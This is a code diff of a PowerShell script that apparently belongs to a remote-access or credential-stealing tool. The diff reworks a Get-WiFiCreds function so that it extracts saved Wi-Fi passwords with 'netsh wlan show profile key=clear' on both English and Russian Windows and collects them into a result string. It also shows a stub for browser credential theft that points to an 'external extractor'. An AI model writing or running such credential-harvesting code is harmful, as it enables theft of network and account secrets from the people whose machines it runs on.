@@ -84,31 +84,33 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        $profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object {
-            ($_ -split ":")[1].Trim()
-        }
+        $output = cmd /c "netsh wlan show profiles" | Out-String
+        $profiles = $output -split "`n" | Where-Object { $_ -match "Все профили пользователей" -or $_ -match "All User Profile" }
 
-        if (-not $profiles -or $profiles.Count -eq 0) {
+        if (-not $profiles) {
             return "[INFO] No Wi-Fi profiles found (adapter may be disabled or unavailable)."
         }
 
         $results = ""
-        foreach ($profile in $profiles) {
+        foreach ($line in $profiles) {
+            $profile = ($line -split ":")[1].Trim()
             $results += "`n[$profile]`n"
-            $details = netsh wlan show profile name="$profile" key=clear 2>$null
-            $keys = $details | Select-String "Key Content"
-            if ($keys) {
-                $results += ($keys | ForEach-Object { $_.ToString() }) -join "`n"
+            $details = cmd /c "netsh wlan show profile name=""$profile"" key=clear" | Out-String
+            $key = ($details -split "`n") | Where-Object { $_ -match "Содержимое ключа|Key Content" }
+            if ($key) {
+                $results += ($key -join "`n")
             } else {
-                $results += "[!] No key found (probably open network)`n"
+                $results += "[!] No key found"
             }
         }
+
         return $results
     }
     catch {
         return "[ERROR] Failed to retrieve Wi-Fi credentials: $($_.Exception.Message)"
     }
 }
+
 
     function Get-BrowserCreds {
         return "[INFO] Browser creds not implemented — use external extractor."
